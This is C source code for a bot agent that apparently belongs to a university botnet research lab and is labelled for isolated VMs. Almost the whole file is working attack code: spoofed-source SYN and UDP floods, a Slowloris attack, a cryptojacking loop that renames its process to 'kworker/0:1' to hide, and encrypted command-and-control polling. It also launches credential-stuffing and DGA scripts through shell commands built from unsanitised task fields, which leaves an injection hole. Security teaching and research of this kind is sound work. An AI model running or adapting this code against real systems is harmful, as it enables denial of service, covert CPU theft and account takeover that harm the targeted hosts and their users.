/*
 * ====================================================
 *  AUA CS 232/337 - Botnet Research Project
 *  Component: Bot Agent v3 (C)
 *  Modules: SYN Flood, UDP Flood, Slowloris, Cryptojack, Heartbeat
 *  Environment: ISOLATED VM LAB ONLY
 *  Compile: gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto
 *  Run:     sudo ./bot_agent
 * ====================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
/* MD5 is used only for IV derivation — suppress OpenSSL 3.x deprecation warning */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
#include <openssl/md5.h>
#pragma GCC diagnostic pop
#include <openssl/bio.h>
#include <openssl/buffer.h>

/* ── Configuration ─────────────────────────────────────────── */
#define C2_IP          "127.0.0.1"
#define C2_PORT        5000
#define AUTH_TOKEN     "aw"
#define SHARED_SECRET  "AUA_LAB_2026_KEY"
#define HEARTBEAT_SEC  5
#define BOT_ID_LEN     32
#define RESP_BUF       8192

/* ── Slowloris config ────────────────────────────────────────── */
#define SLOWLORIS_SOCKETS  150
#define SLOWLORIS_INTERVAL 10    /* seconds between header drips */

/* ── Cryptojack config ───────────────────────────────────────── */
#define CRYPTO_TARGET_PCT  0.25  /* 25% CPU per cycle */
#define CRYPTO_CYCLE_MS    100   /* work window in ms */

typedef struct {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t length;
} PseudoHeader;

#define PKT_BUF 4096

char g_bot_id[BOT_ID_LEN];
volatile int g_running = 1;

static unsigned char g_aes_key[16];
static int           g_aes_ready = 0;

/* ── Crypto helpers ──────────────────────────────────────────── */
/* Derive a 16-byte AES key from an arbitrary secret string and store it
 * in g_aes_key.  This is called at startup (with SHARED_SECRET) and again
 * whenever an update_secret command is received so Phase 1 bots can
 * participate in the same key-rotation workflow as Phase 2/3 bots.     */
static void derive_key_from_secret(const char *secret) {
    unsigned char h[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char *)secret, strlen(secret), h);
    memcpy(g_aes_key, h, 16);
    g_aes_ready = 1;
}

/* Convenience wrapper: derive from the compiled-in default. */
static void derive_key(void) {
    derive_key_from_secret(SHARED_SECRET);
}

static void derive_iv(const char *nonce, unsigned char *iv) {
    MD5((const unsigned char *)nonce, strlen(nonce), iv);
}

static int b64_decode(const char *b64_in, unsigned char *out, int out_len) {
    BIO *b64  = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new_mem_buf(b64_in, (int)strlen(b64_in));
    if (!b64 || !bmem) { BIO_free_all(b64); BIO_free_all(bmem); return -1; }
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    int n = BIO_read(bmem, out, out_len);
    BIO_free_all(bmem);
    return n;
}

static int aes_cbc_decrypt(const unsigned char *ct, int ct_len,
                             const unsigned char *key, const unsigned char *iv,
                             unsigned char *pt) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    int len = 0, total = 0;
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) ||
        !EVP_DecryptUpdate(ctx, pt, &len, ct, ct_len))
        { EVP_CIPHER_CTX_free(ctx); return -1; }
    total = len;
    if (!EVP_DecryptFinal_ex(ctx, pt + len, &len))
        { EVP_CIPHER_CTX_free(ctx); return -1; }
    total += len;
    EVP_CIPHER_CTX_free(ctx);
    pt[total] = '\0';
    return total;
}

static int json_str_field(const char *json, const char *key,
                           char *out, int out_len) {
    char needle[64];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ') p++;   /* skip optional space after colon */
    if (*p != '"') return 0;
    p++;                      /* skip opening quote */
    const char *end = strchr(p, '"');
    if (!end) return 0;
    int len = (int)(end - p);
    if (len >= out_len) len = out_len - 1;
    memcpy(out, p, len);
    out[len] = '\0';
    return 1;
}

static int json_int_field(const char *json, const char *key, int def) {
    char needle[64];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return def;
    p += strlen(needle);
    while (*p == ' ') p++;
    return atoi(p);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) {
        oddbyte = 0; *((unsigned char*)&oddbyte) = *(unsigned char*)ptr; sum += oddbyte;
    }
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void gen_bot_id(char *out) {
    char hostname[64];
    gethostname(hostname, sizeof(hostname));
    snprintf(out, BOT_ID_LEN, "bot_%s_%d", hostname, getpid());
}

/* ══════════════════════════════════════════════════════════════
 *  ATTACK MODULES
 * ══════════════════════════════════════════════════════════════ */

/* ── SYN Flood ───────────────────────────────────────────────── */
void syn_flood(const char *target_ip, int target_port, int duration) {
    printf("[BOT] SYN FLOOD -> %s:%d  duration=%ds\n", target_ip, target_port, duration);
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("[BOT] socket"); return; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    char packet[PKT_BUF];
    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    time_t end_time = time(NULL) + duration;
    long count = 0;
    srand(time(NULL) ^ getpid());
    while (time(NULL) < end_time && g_running) {
        memset(packet, 0, PKT_BUF);
        uint32_t fake_src = htonl(0x0A000000 | (rand() & 0x00FFFFFF));
        ip->ihl = 5; ip->version = 4; ip->tos = 0;
        ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id       = htons(rand() & 0xFFFF);
        ip->frag_off = 0; ip->ttl = 64; ip->protocol = IPPROTO_TCP;
        ip->check    = 0; ip->saddr = fake_src; ip->daddr = dst.sin_addr.s_addr;
        tcp->source  = htons(1024 + (rand() % 60000));
        tcp->dest    = htons(target_port);
        tcp->seq     = htonl(rand()); tcp->ack_seq = 0; tcp->doff = 5;
        tcp->syn     = 1; tcp->window = htons(65535);
        tcp->check   = 0; tcp->urg_ptr = 0;
        PseudoHeader ph = {0};
        ph.src_addr = fake_src; ph.dst_addr = dst.sin_addr.s_addr;
        ph.protocol = IPPROTO_TCP; ph.length = htons(sizeof(struct tcphdr));
        char chk_buf[sizeof(PseudoHeader) + sizeof(struct tcphdr)];
        memcpy(chk_buf, &ph, sizeof(PseudoHeader));
        memcpy(chk_buf + sizeof(PseudoHeader), tcp, sizeof(struct tcphdr));
        tcp->check = checksum((unsigned short *)chk_buf, sizeof(chk_buf));
        sendto(sock, packet, ntohs(ip->tot_len), 0,
               (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[BOT] SYN FLOOD done. Packets sent: %ld\n", count);
}

/* ── UDP Flood ───────────────────────────────────────────────── */
void udp_flood(const char *target_ip, int target_port, int duration) {
    printf("[BOT] UDP FLOOD -> %s:%d  duration=%ds\n", target_ip, target_port, duration);
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) { perror("[BOT] socket"); return; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(target_ip);
    char payload[1024] = {0};
    char packet[PKT_BUF];
    struct iphdr  *ip  = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    int pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(payload);
    time_t end_time = time(NULL) + duration;
    long count = 0;
    srand(time(NULL) ^ getpid() ^ 0xDEAD);
    while (time(NULL) < end_time && g_running) {
        memset(packet, 0, pkt_len);
        int dst_port = 1 + (rand() % 65534);
        ip->ihl = 5; ip->version = 4; ip->tot_len = htons(pkt_len);
        ip->ttl = 64; ip->protocol = IPPROTO_UDP;
        ip->saddr = htonl(0x0A000000 | (rand() & 0x00FFFFFF));
        ip->daddr = dst.sin_addr.s_addr;
        udp->source = htons(1024 + (rand() % 60000));
        udp->dest   = htons(dst_port);
        udp->len    = htons(sizeof(struct udphdr) + sizeof(payload));
        udp->check  = 0;
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr),
               payload, sizeof(payload));
        sendto(sock, packet, pkt_len, 0, (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[BOT] UDP FLOOD done. Packets sent: %ld\n", count);
}

/* ── Slowloris (C implementation) ───────────────────────────── */
/* Maintains a pool of half-open HTTP connections by dripping    */
/* one keep-alive header line ("X-a: N\r\n") every              */
/* SLOWLORIS_INTERVAL seconds — exhausts Apache's thread pool.  */
/* The request is never completed (no final \r\n\r\n is sent),  */
/* so Apache holds the connection thread open indefinitely.      */
typedef struct {
    char target_ip[64];
    int  target_port;
    int  duration;
} SlowlorisArgs;

static void *slowloris_thread(void *arg) {
    SlowlorisArgs *a = (SlowlorisArgs *)arg;
    printf("[BOT] SLOWLORIS -> %s:%d  duration=%ds  sockets=%d\n",
           a->target_ip, a->target_port, a->duration, SLOWLORIS_SOCKETS);

    int socks[SLOWLORIS_SOCKETS];
    int n_open = 0;

    /* Phase 1: open initial socket pool */
    for (int i = 0; i < SLOWLORIS_SOCKETS; i++) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct timeval tv = {4, 0};
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        struct sockaddr_in dst = {0};
        dst.sin_family      = AF_INET;
        dst.sin_port        = htons(a->target_port);
        dst.sin_addr.s_addr = inet_addr(a->target_ip);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            close(s); continue;
        }
        /* Send partial HTTP GET — deliberately no final \r\n */
        char buf[256];
        snprintf(buf, sizeof(buf),
                 "GET /?%d HTTP/1.1\r\nHost: %s\r\n"
                 "User-Agent: Mozilla/5.0\r\n"
                 "Accept-Language: en-US,en;q=0.5\r\n",
                 rand() % 99999, a->target_ip);
        send(s, buf, strlen(buf), 0);
        socks[n_open++] = s;
    }
    printf("[BOT] SLOWLORIS: opened %d/%d sockets\n", n_open, SLOWLORIS_SOCKETS);

    /* Phase 2: keep-alive drip loop */
    time_t end_time = time(NULL) + a->duration;
    while (time(NULL) < end_time && g_running) {
        int dead_count = 0;
        for (int i = 0; i < n_open; i++) {
            if (socks[i] < 0) { dead_count++; continue; }
            char drip[64];
            snprintf(drip, sizeof(drip), "X-a: %d\r\n", rand() % 5000);
            if (send(socks[i], drip, strlen(drip), 0) < 0) {
                close(socks[i]); socks[i] = -1; dead_count++;
            }
        }
        /* Refill dead sockets */
        for (int i = 0; i < n_open && dead_count > 0; i++) {
            if (socks[i] >= 0) continue;
            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) continue;
            struct timeval tv = {4, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            struct sockaddr_in dst = {0};
            dst.sin_family      = AF_INET;
            dst.sin_port        = htons(a->target_port);
            dst.sin_addr.s_addr = inet_addr(a->target_ip);
            if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
                char buf[256];
                snprintf(buf, sizeof(buf),
                         "GET /?%d HTTP/1.1\r\nHost: %s\r\n", rand()%99999, a->target_ip);
                send(s, buf, strlen(buf), 0);
                socks[i] = s; dead_count--;
            } else {
                close(s);
            }
        }
        printf("[BOT] SLOWLORIS: %d active sockets\n", n_open - dead_count);
        sleep(SLOWLORIS_INTERVAL);
    }
    /* Cleanup */
    for (int i = 0; i < n_open; i++)
        if (socks[i] >= 0) close(socks[i]);
    printf("[BOT] SLOWLORIS done.\n");
    free(a);
    return NULL;
}

/* ── Cryptojacking (CPU throttle) ───────────────────────────── */
/* Uses duty-cycle SHA-256 hashing to simulate throttled miner.  */
typedef struct {
    float  target_pct;
    int    duration;
} CryptojackArgs;

static void *cryptojack_thread(void *arg) {
    CryptojackArgs *a = (CryptojackArgs *)arg;
    printf("[BOT] CRYPTOJACK started: target_cpu=%.0f%%  duration=%ds\n",
           a->target_pct * 100, a->duration);
    /* Write process name to /proc/self/comm (mimics cryptojack_sim.py) */
    FILE *comm = fopen("/proc/self/comm", "w");
    if (comm) { fputs("kworker/0:1", comm); fclose(comm); }

    time_t end_time = time(NULL) + a->duration;
    unsigned char state[32];
    for (int i = 0; i < 32; i++) state[i] = rand() & 0xFF;
    unsigned long hashes = 0;

    while (time(NULL) < end_time && g_running) {
        /* Work phase: burn CPU for target_pct * CYCLE_MS ms */
        struct timespec work_end;
        clock_gettime(CLOCK_MONOTONIC, &work_end);
        long work_ns = (long)(a->target_pct * CRYPTO_CYCLE_MS * 1000000L);
        work_end.tv_nsec += work_ns;
        if (work_end.tv_nsec >= 1000000000L) {
            work_end.tv_sec++; work_end.tv_nsec -= 1000000000L;
        }
        struct timespec now;
        while (1) {
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > work_end.tv_sec ||
               (now.tv_sec == work_end.tv_sec && now.tv_nsec >= work_end.tv_nsec)) break;
            /* SHA-256 hash chain — same pattern as real miner work unit */
            SHA256(state, 32, state);
            hashes++;
        }
        /* Sleep phase: yield for (1 - target_pct) * CYCLE_MS ms */
        long sleep_us = (long)((1.0f - a->target_pct) * CRYPTO_CYCLE_MS * 1000L);
        usleep((useconds_t)sleep_us);
    }
    printf("[BOT] CRYPTOJACK done. Simulated hashes: %lu\n", hashes);
    /* Restore process name */
    comm = fopen("/proc/self/comm", "w");
    if (comm) { fputs("bot_agent", comm); fclose(comm); }
    free(a);
    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 *  HTTP / C2 COMMUNICATION
 * ══════════════════════════════════════════════════════════════ */
int http_post(const char *host, int port, const char *path,
              const char *body, char *resp_buf, int resp_len) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct hostent *he = gethostbyname(host);
    if (!he) { close(sock); return -1; }
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }
    char req[2048];
    int n = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "X-Auth-Token: %s\r\n"
        "Connection: close\r\n\r\n%s",
        path, host, port, strlen(body), AUTH_TOKEN, body);
    send(sock, req, n, 0);
    int total = 0, r;
    while (total < resp_len - 1 &&
           (r = recv(sock, resp_buf + total, resp_len - 1 - total, 0)) > 0)
        total += r;
    if (total > 0) resp_buf[total] = '\0';
    close(sock);
    return total;
}

void bot_register(void) {
    char hostname[64]; gethostname(hostname, sizeof(hostname));
    char body[256];
    snprintf(body, sizeof(body),
        "{\"bot_id\":\"%s\",\"hostname\":\"%s\",\"arch\":\"x86_64\",\"enc\":1}",
        g_bot_id, hostname);
    char resp[RESP_BUF] = {0};
    int r = http_post(C2_IP, C2_PORT, "/register", body, resp, sizeof(resp));
    if (r > 0) printf("[BOT] Registered (enc=1). Response: %.80s\n", resp);
    else printf("[BOT] Registration failed (is C2 running?)\n");
}

/* ── Result reporting ───────────────────────────────────────── */
/* POST a task-completion notice to /result so the C2 operator can
 * correlate task dispatch with execution outcomes per-bot.
 * task_type : the command type string (e.g. "syn_flood")
 * status    : short human-readable outcome ("completed", "started", etc.)
 *
 * NOTE: synchronous attacks (syn_flood, udp_flood) post "completed" after
 * the blocking call returns.  Asynchronous attacks that run in detached
 * threads (slowloris, cryptojack) and subprocess-delegated commands
 * (cred_stuffing, dga_search) post "started" immediately after the thread
 * or process is launched.  Key-rotation responses report "key_rotated" or
 * "rejected_too_short".  The operator should wait ~duration seconds before
 * checking portal attempt counts for async tasks.                          */
void bot_post_result(const char *task_type, const char *status) {
    char body[320];
    snprintf(body, sizeof(body),
             "{\"bot_id\":\"%s\",\"result\":{\"type\":\"%s\",\"status\":\"%s\"}}",
             g_bot_id, task_type, status);
    char resp[RESP_BUF] = {0};
    int r = http_post(C2_IP, C2_PORT, "/result", body, resp, sizeof(resp));
    if (r > 0)
        printf("[BOT] Result posted: type=%s status=%s\n", task_type, status);
    else
        printf("[BOT] Result post failed (C2 unreachable?)\n");
}

/* ── Task dispatcher ─────────────────────────────────────────── */
static void dispatch_task(const char *task_json) {
    char type[32]      = {0};
    char target_ip[48] = "192.168.100.20";
    json_str_field(task_json, "type",      type,      sizeof(type));
    json_str_field(task_json, "target_ip", target_ip, sizeof(target_ip));
    int port     = json_int_field(task_json, "target_port", 8080);
    int duration = json_int_field(task_json, "duration",    10);
    float cpu    = 0.25f;

    printf("[BOT] TASK type=%s target=%s:%d duration=%ds\n",
           type, target_ip, port, duration);

    if (strcmp(type, "syn_flood") == 0) {
        syn_flood(target_ip, port, duration);
        bot_post_result("syn_flood", "completed");

    } else if (strcmp(type, "udp_flood") == 0) {
        udp_flood(target_ip, port, duration);
        bot_post_result("udp_flood", "completed");

    } else if (strcmp(type, "slowloris") == 0) {
        SlowlorisArgs *a = malloc(sizeof(SlowlorisArgs));
        if (!a) return;
        strncpy(a->target_ip, target_ip, 63);
        a->target_port = port;
        a->duration    = duration;
        pthread_t t;
        pthread_create(&t, NULL, slowloris_thread, a);
        pthread_detach(t);
        bot_post_result("slowloris", "started");

    } else if (strcmp(type, "cryptojack") == 0) {
        const char *cpu_p = strstr(task_json, "\"cpu\":");
        if (cpu_p) cpu = atof(cpu_p + 6);
        CryptojackArgs *a = malloc(sizeof(CryptojackArgs));
        if (!a) return;
        a->target_pct = cpu;
        a->duration   = duration;
        pthread_t t;
        pthread_create(&t, NULL, cryptojack_thread, a);
        pthread_detach(t);
        bot_post_result("cryptojack", "started");

    } else if (strcmp(type, "cred_stuffing") == 0) {
        /*
         * Delegate to cred_stuffing.py, forwarding all task fields
         * so the operator's mode/jitter/workers choices are respected.
         *
         * The subprocess is wrapped with the system 'timeout' utility so
         * it is killed after 'duration' seconds, preventing orphaned
         * Python processes from accumulating when a bot receives rapid
         * task sequences.
         *
         * Fields parsed from task JSON:
         *   target_ip   — victim host  (default 192.168.100.20)
         *   target_port — HTTP port    (8080)
         *   duration    — seconds      (default 120, passed as shell timeout)
         *   mode        — "bot"|"jitter"|"distributed"  (default "jitter")
         *   jitter      — int ms       (default 200)
         *   workers     — int threads  (default 3, distributed mode only)
         */
        char mode[32]    = "jitter";
        int  jitter_ms   = 200;
        int  workers     = 3;
        int  dur         = json_int_field(task_json, "duration", 120);

        /* Extract mode string */
        json_str_field(task_json, "mode", mode, sizeof(mode));

        /* Extract optional int fields */
        const char *jp = strstr(task_json, "\"jitter\":");
        if (jp) jitter_ms = atoi(jp + 9);
        const char *wp = strstr(task_json, "\"workers\":");
        if (wp) workers = atoi(wp + 10);

        char cmd[512];
        if (strcmp(mode, "distributed") == 0) {
            snprintf(cmd, sizeof(cmd),
                     "timeout %d python3 cred_stuffing.py"
                     " --mode distributed"
                     " --host %s --port %d"
                     " --workers %d &",
                     dur, target_ip, port, workers);
        } else {
            snprintf(cmd, sizeof(cmd),
                     "timeout %d python3 cred_stuffing.py"
                     " --mode %s"
                     " --host %s --port %d"
                     " --interval 500 --jitter %d &",
                     dur, mode, target_ip, port, jitter_ms);
        }
        printf("[BOT] Spawning credential stuffing: %s\n", cmd);
        system(cmd);
        bot_post_result("cred_stuffing", "started");

    } else if (strcmp(type, "dga_search") == 0) {
        /* Trigger DGA domain search (spawns Python dga.py) */
        printf("[BOT] Triggering DGA C2 search\n");
        system("python3 dga.py &");
        bot_post_result("dga_search", "started");

    } else if (strcmp(type, "idle") == 0 || type[0] == '\0') {
        /* no-op */

    /* ── Key rotation (Phase 1 parity with Phase 2/3) ───────────────────
     * The C2 server's POST /rotate_key sends an update_secret task to every
     * registered bot (encrypted with the CURRENT key so bots can decrypt it)
     * and then switches to the new key.  Bots that handle this command call
     * derive_key_from_secret() to adopt the same new key, keeping Phase 1
     * bots in sync with Phase 2/3 bots through the entire rotation cycle.  */
    } else if (strcmp(type, "update_secret") == 0) {
        char new_secret[64] = {0};
        json_str_field(task_json, "secret", new_secret, sizeof(new_secret));
        if (strlen(new_secret) >= 8) {
            derive_key_from_secret(new_secret);
            printf("[BOT] AES key rotated. New key: ");
            for (int i = 0; i < 16; i++) printf("%02x", g_aes_key[i]);
            printf("\n");
            bot_post_result("update_secret", "key_rotated");
        } else {
            printf("[BOT] update_secret ignored: secret must be >=8 chars\n");
            bot_post_result("update_secret", "rejected_too_short");
        }

    } else {
        printf("[BOT] Unknown task type: %s\n", type);
    }
}

/* ── Parse and execute task from C2 response ─────────────────── */
void parse_and_execute_task(const char *resp) {
    if (!resp || strstr(resp, "\"task\": null") || strstr(resp, "\"task\":null"))
        return;
    const char *task = strstr(resp, "\"task\":");
    if (!task) return;
    task += 7;
    while (*task == ' ') task++;

    /* Encrypted path */
    if (strstr(task, "\"enc\": 1") || strstr(task, "\"enc\":1")) {
        if (!g_aes_ready) { printf("[BOT] AES key not ready\n"); return; }
        char nonce[64] = {0}, b64_data[4096] = {0};
        if (!json_str_field(task, "nonce", nonce, sizeof(nonce)) ||
            !json_str_field(task, "data",  b64_data, sizeof(b64_data))) {
            printf("[BOT] Malformed encrypted task\n"); return;
        }
        unsigned char iv[16] = {0};
        derive_iv(nonce, iv);
        unsigned char ct[2048] = {0};
        int ct_len = b64_decode(b64_data, ct, sizeof(ct));
        if (ct_len <= 0) { printf("[BOT] base64 decode failed\n"); return; }
        unsigned char pt[2048] = {0};
        int pt_len = aes_cbc_decrypt(ct, ct_len, g_aes_key, iv, pt);
        if (pt_len <= 0) { printf("[BOT] AES decrypt failed\n"); return; }
        printf("[BOT] Decrypted task: %.120s\n", (char *)pt);
        dispatch_task((char *)pt);
    } else {
        dispatch_task(task);
    }
}

/* ── Heartbeat loop ──────────────────────────────────────────── */
void *heartbeat_loop(void *arg) {
    (void)arg;
    printf("[BOT] Heartbeat loop started (every %ds)\n", HEARTBEAT_SEC);
    while (g_running) {
        char body[128];
        snprintf(body, sizeof(body), "{\"bot_id\":\"%s\"}", g_bot_id);
        char resp[RESP_BUF] = {0};
        int r = http_post(C2_IP, C2_PORT, "/heartbeat", body, resp, sizeof(resp));
        if (r > 0) {
            char *json_start = strstr(resp, "\r\n\r\n");
            if (json_start) parse_and_execute_task(json_start + 4);
        }
        sleep(HEARTBEAT_SEC);
    }
    return NULL;
}

/* ── Entry point ─────────────────────────────────────────────── */
int main(void) {
    if (getuid() != 0) {
        fprintf(stderr, "[BOT] Must run as root (raw sockets require root)\n");
        return 1;
    }
    printf("==============================================\n");
    printf(" Bot Agent v3 - AUA Botnet Research Lab\n");
    printf(" C2: %s:%d\n", C2_IP, C2_PORT);
    printf(" Crypto: AES-128-CBC (OpenSSL)\n");
    printf(" Payloads: SYN/UDP flood, Slowloris, Cryptojack\n");
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n");

    derive_key();
    printf("[BOT] AES key: ");
    for (int i = 0; i < 16; i++) printf("%02x", g_aes_key[i]);
    printf("\n");

    gen_bot_id(g_bot_id);
    printf("[BOT] Bot ID: %s\n", g_bot_id);

    bot_register();

    pthread_t hb_thread;
    pthread_create(&hb_thread, NULL, heartbeat_loop, NULL);
    pthread_join(hb_thread, NULL);
    return 0;
}